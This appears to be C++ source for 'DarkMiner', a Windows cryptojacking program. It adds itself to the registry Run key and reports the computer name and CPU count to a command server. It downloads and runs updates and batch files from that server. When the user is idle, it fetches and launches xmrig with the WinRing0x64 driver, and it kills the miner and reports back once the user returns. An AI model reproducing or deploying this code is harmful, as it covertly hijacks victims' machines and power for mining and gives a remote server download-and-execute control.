//Changelog
//Most recent edit was getting rid of 64 bit declerations and miner part
//-------------
//TODO
//Clean up the code and comment the code
//Fix it to make windows 10 compatable
#include "main.h"
void timer();
void miner();
void ActiveCheck();
int Update();
void Startup();
int information();
std::string HttpRequest(std::string site, std::string param);
int timertime = 1;
int FileVersion = 6;
static const unsigned int idle_milliseconds = 60 * timertime * 1000;
static const unsigned int interval = 60 * 60 * 1000;
int version = information();
TCHAR  infoBuf[INFO_BUFFER_SIZE];
DWORD  bufCharCount = INFO_BUFFER_SIZE;
int main() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	Startup();
	Sleep(10);
	GetComputerName(infoBuf, &bufCharCount);
	SYSTEM_INFO info;
	GetSystemInfo(&info);
	std::ostringstream infostringstreem;
	infostringstreem << ("coms.php?name=") << infoBuf << "&CPU=" << info.dwNumberOfProcessors << "&version=" << version;
	std::string infostring = infostringstreem.str();
	std::string webcall;
	do{
		webcall = HttpRequest("www.localhost.com", infostring);
		if (webcall == "-1") {
			std::cout << "Failed connection";
			Sleep(60000);
			continue;
		}
	} while (webcall == "-1");
	int my_response_version = std::stoi(webcall);
	std::cout << my_response_version<<std::endl;
	std::cout << version;
	if (my_response_version > version) {
		int upCheck = Update();

		if (upCheck = 1) {
			std::ofstream myfile;
			myfile.open("C:\\Program Files (x86)\\DarkMiner\\Version.txt");
			myfile << FileVersion;
			myfile.close();
			const TCHAR File1[] = _T("C:\\Program Files (x86)\\DarkMiner\\DarkMinerUpdate.bat");
			ShellExecute(NULL, "open", File1, "", "", SW_SHOW);
			return 0;
		}
		else {

		}
		
	}
	std::async(timer);
}
int information() {
	int version;
	std::ifstream file;
	file.open("C:\\Program Files (x86)\\DarkMiner\\Version.txt");
	if (file.good()) {
		file >> version;
		file.close();
		return version;
	}
	else {
		std::ofstream myfile;
		myfile.open("C:\\Program Files (x86)\\DarkMiner\\Version.txt");
		myfile << FileVersion;
		myfile.close();
		return 0;
	}
}
void Startup() {
	HKEY hKey;
	RegOpenKeyExA(
		HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_WRITE,
		&hKey
	);

	const BYTE myapp[] = _T("C:\\Program Files (x86)\\DarkMiner\\DarkMiner.exe");
	RegSetValueExA(hKey, "DarkMiner", 0, REG_SZ, myapp, sizeof(myapp));
	RegCloseKey(hKey);
}

void timer() {
	LASTINPUTINFO last_input;
	BOOL screensaver_active;
	DWORD idle_time;
	last_input.cbSize = sizeof(last_input);
	// main loop to check if user has been idle long enough
	for (;;) {
		std::cout << "Loop";
		if (!GetLastInputInfo(&last_input)
			|| !SystemParametersInfo(SPI_GETSCREENSAVERRUNNING, 0,
				&screensaver_active, 0))
		{
			std::cout << "WinAPI failed!" << std::endl;
		}
		idle_time = GetTickCount() - last_input.dwTime;
		if (idle_time < idle_milliseconds && !screensaver_active) {
			std::cout << "Not enought time: " << idle_time << "idle_milliseconds: " << idle_milliseconds;
			Sleep(1000);
			continue;
		}
		miner();
		Sleep(interval);
	}
}
int Update() {
	HRESULT hr;
	const TCHAR Url[] = _T("http://localhost.com/DarkMiner/DarkMiner.exe");
	const TCHAR File[] = _T("C:\\Program Files (x86)\\DarkMiner\\DarkMinerUpdate.exe");
	DeleteUrlCacheEntry(Url);
	hr = URLDownloadToFile(0, Url, File, 0, NULL);
	switch (hr)
	{
		case S_OK: std::cout << "Successful download\n"; break;
		case E_OUTOFMEMORY: std::cout << "Out of memory error\n"; return 0;
		case INET_E_DOWNLOAD_FAILURE:    std::cout << "Cannot access server data\n"; return 0;
		default: std::cout << "Unknown error"; return 0;
	}
	HRESULT hrbat;
	const TCHAR Url1[] = _T("http://localhost.com/DarkMiner/DarkMinerUpdate.bat");
	const TCHAR File1[] = _T("C:\\Program Files (x86)\\DarkMiner\\DarkMinerUpdate.bat");
	DeleteUrlCacheEntry(Url1);
	hrbat = URLDownloadToFile(0, Url1, File1, 0, NULL);
	switch (hrbat)
	{
	case S_OK: std::cout << "Successful download\n"; break;
	case E_OUTOFMEMORY: std::cout << "Out of memory error\n"; return 0;
	case INET_E_DOWNLOAD_FAILURE:    std::cout << "Cannot access server data\n"; return 0;
	default: std::cout << "Unknown error"; return 0;
	}

	return 1;
}
//Mines the server (Miner Works on 64 and 32 bit systems)
void miner() {
	std::cout << "Ran Miner";
	std::ostringstream infostringstreem;
	infostringstreem << ("Blog.php?name=") << infoBuf << "&Mining=" << "1";
	std::string infostring = infostringstreem.str();
	std::string Mining = HttpRequest("www.localhost.com", infostring);
	std::cout << "Ran Miner64";
	HRESULT hr;
	HRESULT hr1;
	HRESULT hr2;
	const TCHAR Url[] = _T("http://localhost.com/DarkMiner/xmrig.exe");
	const TCHAR File[] = _T("C:\\Program Files (x86)\\DarkMiner\\miner.exe");
	const TCHAR Url1[] = _T("http://localhost.com/DarkMiner/WinRing0x64.sys");
	const TCHAR File1[] = _T("C:\\Program Files (x86)\\DarkMiner\\WinRing0x64.sys");
	const TCHAR Url2[] = _T("http://localhost.com/DarkMiner/config.json");
	const TCHAR File2[] = _T("C:\\Program Files (x86)\\DarkMiner\\config.json");
	hr = URLDownloadToFile(0, Url, File, 0, NULL);
	switch (hr)
	{
		case S_OK: std::cout << "Successful download\n"; break;
		case E_OUTOFMEMORY: std::cout << "Out of memory error\n"; break;
		case INET_E_DOWNLOAD_FAILURE:    std::cout << "Cannot access server data\n"; break;
		default: std::cout << "Unknown error"; break;
	}
	hr1 = URLDownloadToFile(0, Url1, File1, 0, NULL);
	switch (hr1)
	{
	case S_OK: std::cout << "Successful download\n"; break;
	case E_OUTOFMEMORY: std::cout << "Out of memory error\n"; break;
	case INET_E_DOWNLOAD_FAILURE:    std::cout << "Cannot access server data\n"; break;
	default: std::cout << "Unknown error"; break;
	}

	hr2 = URLDownloadToFile(0, Url2, File2, 0, NULL);
	switch (hr2)
	{
	case S_OK: std::cout << "Successful download\n"; break;
	case E_OUTOFMEMORY: std::cout << "Out of memory error\n"; break;
	case INET_E_DOWNLOAD_FAILURE:    std::cout << "Cannot access server data\n"; break;
	default: std::cout << "Unknown error"; break;
	}

//	hr3 = URLDownloadToFile(0, Url3, File3, 0, NULL);
//	switch (hr3)
//	{
//	case S_OK: std::cout << "Successful download\n"; break;
//	case E_OUTOFMEMORY: std::cout << "Out of memory error\n"; break;
//	case INET_E_DOWNLOAD_FAILURE:    std::cout << "Cannot access server data\n"; break;
//	default: std::cout << "Unknown error"; break;
//	}
//	hr4 = URLDownloadToFile(0, Url4, File4, 0, NULL);
//	switch (hr4)
//	{
//	case S_OK: std::cout << "Successful download\n"; break;
//	case E_OUTOFMEMORY: std::cout << "Out of memory error\n"; break;
//	case INET_E_DOWNLOAD_FAILURE:    std::cout << "Cannot access server data\n"; break;
//	default: std::cout << "Unknown error"; break;
//	}
//	hr5 = URLDownloadToFile(0, Url5, File5, 0, NULL);
//	switch (hr5)
//	{
//	case S_OK: std::cout << "Successful download\n"; break;
//	case E_OUTOFMEMORY: std::cout << "Out of memory error\n"; break;
//	case INET_E_DOWNLOAD_FAILURE:    std::cout << "Cannot access server data\n"; break;
//	default: std::cout << "Unknown error"; break;
//	}


//	std::stringstream commands;
//	commands << "-u lukejet7@gmail.com --xmr -g";
//	std::string sstr = commands.str();
//	LPCSTR cstr = sstr.c_str();
//	std::cout << cstr << "||" << File;
//	ShellExecute(NULL, "open", File, cstr, "", SW_HIDE);
	//ShellExecute(NULL, "open", File, "", "", SW_HIDE);
	ShellExecute(NULL, "open", File, "", "", SW_SHOW);
	ActiveCheck();
}

void ActiveCheck() {
	LASTINPUTINFO last_input;
	BOOL screensaver_active;
	DWORD idle_time;
	last_input.cbSize = sizeof(last_input);
	// main loop to check if user has been idle long enough
	for (;;) {
		std::cout << "ActivityLoop";
		if (!GetLastInputInfo(&last_input)
			|| !SystemParametersInfo(SPI_GETSCREENSAVERRUNNING, 0,
				&screensaver_active, 0))
		{
			std::cout << "WinAPI failed!" << std::endl;
		}
		idle_time = GetTickCount() - last_input.dwTime;
		if (idle_time > idle_milliseconds && !screensaver_active) {
			// user hasn't been idle for long enough
			// AND no screensaver is running
			std::cout << "No Activity";
			Sleep(1000); //Change this time don't want to ping the server ever secound
			continue;
		}
		system("taskkill /F /T /IM miner.exe");
		std::ostringstream infostringstreem;
		infostringstreem << ("coms.php?name=") << infoBuf << "&Mining=" << "0";
		std::string infostring = infostringstreem.str();
		std::string Mining = HttpRequest("www.localhost.com", infostring);
		timer();
	}
}
//Talk to server
std::string HttpRequest(std::string site, std::string param) {
	HINTERNET hInternet = InternetOpenW(L"YourUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL)
	{
		std::cout << "InternetOpenW failed(hInternet): " + GetLastError();
		return "-1";
	}
	else
	{
		std::wstring widestr;
		for (int i = 0; i < site.length(); ++i)
		{
			widestr += wchar_t(site[i]);
		}
		const wchar_t* site_name = widestr.c_str();
		std::wstring widestr2;
		for (int i = 0; i < param.length(); ++i)
		{
			widestr2 += wchar_t(param[i]);
		}
		const wchar_t* site_param = widestr2.c_str();
		HINTERNET hConnect = InternetConnectW(hInternet, site_name, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
		if (hConnect == NULL)
		{
			std::cout << "InternetConnectW failed(hConnect == NULL): " + GetLastError();
			return "-1";
		}
		else
		{
			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };

			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", site_param, NULL, NULL, parrAcceptTypes, 0, 0);

			if (hRequest == NULL)
			{
				std::cout << "HttpOpenRequestW failed(hRequest == NULL): " + GetLastError();
				return "-1";
			}
			else
			{
				BOOL bRequestSent = HttpSendRequestW(hRequest, NULL, 0, NULL, 0);

				if (!bRequestSent)
				{
					std::cout << "!bRequestSent    HttpSendRequestW failed with error code " + GetLastError();
					return "-1";
				}
				else
				{
					std::string strResponse;
					const int nBuffSize = 1024;
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0)
					{
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						strResponse.append(buff, dwBytesRead);
					}
					return strResponse;
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
}